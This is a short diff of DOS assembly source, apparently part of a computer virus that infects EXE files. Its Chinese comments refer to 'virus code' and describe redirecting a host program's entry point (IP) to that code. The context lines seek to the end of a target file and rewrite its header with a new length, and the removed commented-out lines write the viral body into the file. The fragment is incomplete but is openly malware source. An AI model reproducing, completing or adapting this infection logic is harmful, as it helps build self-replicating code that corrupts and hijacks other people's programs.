@@ -50,9 +50,6 @@ kill proc
     locate:    
                pop    bp                         ;bp=offset locate
                sub    bp,offset locate           ;bp=0
-    ;  lea    dx,[bp+offset string]       ;输出字符串
-    ;  mov    ah,09h
-    ;  int    21h
 
                lea    dx,[bp+offset dta]         ;置dta
                mov    ah,1ah                     ;	设置磁盘缓冲区DTA，，DS:DX=磁盘缓冲区首址
@@ -98,23 +95,6 @@ kill proc
                xor    dx,dx
                mov    ax,4202h
                int    21h
-    ;--------------------------------------------------
-    ;          push   ax
-    ;          sub    ax,200h
-    ;          mov    cx,ax
-    ;          mov    ax,[si+16h]                ;16-17H:表示 b.exe 被载入后 CS 的相对偏移地址是
-
-    ;          mov    dx,10h
-    ;          mul    dx
-    ;          sub    cx,ax
-    ;          mov    word ptr [si+14h],cx       ;这里我是试出来病毒代码的内存地址的；；修改ip指向，程序入口为病毒代码
-    ;          pop    ax
-    ; ;--------------------------------------------------
-    ;          lea    dx,[bp+offset start]       ;写入代码
-    ;          lea    cx,[bp+offset theend]
-    ;          sub    cx,dx
-    ;          mov    ah,40h
-    ;          int    21h
 
                mov    ax,4202h                   ;计算新文件长度,修改头
                mov    cx,0160h
